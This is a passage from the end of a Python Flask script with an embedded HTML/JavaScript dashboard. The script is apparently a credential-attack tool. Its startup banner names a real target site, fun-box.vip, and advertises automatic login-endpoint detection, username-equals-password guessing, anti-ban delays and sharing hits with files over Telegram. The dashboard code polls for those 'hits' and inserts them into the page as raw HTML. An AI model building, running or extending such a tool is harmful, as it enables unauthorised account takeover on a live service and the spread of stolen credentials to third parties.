            document.getElementById('statTime').textContent = mins + ':' + secs;
        }
    } catch (e) { console.error(e); }
}

async function updateFeed() {
    try {
        const d = await api('/api/feed');
        if (!d.success) return;
        const c = document.getElementById('feedContainer');
        if (!d.feed || d.feed.length === 0) {
            c.innerHTML = '<div style="text-align:center;padding:20px;color:#006622;font-size:11px;">⏳ Waiting...</div>';
            return;
        }
        c.innerHTML = d.feed.slice(0, 50).map(item =>
            `<div class="feed-item ${item.type || 'info'}"><span class="time">${item.time || ''}</span><span>${item.text || ''}</span></div>`
        ).join('');
        document.getElementById('feedCount').textContent = '(' + d.feed.length + ')';
    } catch (e) { console.error(e); }
}

async function updateResults() {
    try {
        const d = await api('/api/results');
        if (!d.success) return;
        const c = document.getElementById('resultContainer');
        if (!d.results || d.results.length === 0) {
            c.innerHTML = '<div style="text-align:center;padding:20px;color:#006622;font-size:11px;">📭 No hits yet</div>';
            return;
        }
        c.innerHTML = d.results.slice(0, 50).map(item =>
            `<div class="result-item">${item.content} ${item.token ? '📄' : ''}</div>`
        ).join('');
        document.getElementById('resultCount').textContent = '(' + d.results.length + ')';
    } catch (e) { console.error(e); }
}

setInterval(updateStats, 500);
setInterval(updateFeed, 600);
setInterval(updateResults, 700);
setInterval(loadEndpoint, 10000);
updateStats(); updateFeed(); updateResults();
</script>
</body>
</html>'''

# ================================================================
# RUN
# ================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 4040))
    print("""
╔══════════════════════════════════════════════════════════════════╗
║   FUN-BOX.VIP ULTIMATE HUNTER - AUTO-ENDPOINT DETECTION       ║
║   🎯 Target: https://fun-box.vip                              ║
║   🔑 Username = Password (Auto)                               ║
║   🛡️ Smart Anti-Ban: 5 min delay if detected                 ║
║   🔍 Auto-detects login endpoint                             ║
║   💾 Saves endpoint to endpoint.txt                          ║
║   📢 Telegram Sharing with Files                             ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{port}")
    print(f"[*] Password: {ADMIN_PASSWORD}")
    print(f"[*] Login Endpoint: {LOGIN_ENDPOINT}")
    print(f"[*] Full URL: {LOGIN_URL}")
    print(f"[*] Endpoint saved in: {ENDPOINT_FILE}")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
